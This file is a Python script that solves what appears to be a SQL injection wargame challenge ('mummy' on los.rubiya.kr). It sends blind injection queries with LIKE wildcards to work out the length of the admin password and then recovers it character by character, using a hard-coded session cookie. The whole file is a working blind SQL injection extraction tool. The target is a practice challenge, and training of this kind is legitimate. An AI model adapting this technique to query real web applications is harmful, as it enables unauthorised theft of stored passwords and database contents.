#!/usr/bin/env python3
# coding: utf-8

import requests
import string

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}

def is_true(query):
    url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php" \
          "?query=[pw]from[prob_mummy]where[id]like'admin'and{0}".format(query)
    r = requests.get(url, headers=headers)
    if r.text.find('<h2>Hello anonymous</h2>') > -1:
        return True
    return False


def get_pw_length():
    i = 1
    while True:
        query = "[pw]like'{0}'".format('_' * i)
        if is_true(query):
            return i
        i += 1


def get_pw():
    password = ''
    length = get_pw_length()
    print('[*] pw length :', length)
    for i in range(length):
        for c in string.printable:
            guess = password + c
            query = "[pw]like'{0}%'".format(guess)
            if is_true(query):
                password += c
                print('[*] leaked pw :', password)
                break
    return password


def main():
    pw = get_pw()
    print('[*] pw :', pw)


if __name__ == '__main__':
    main()

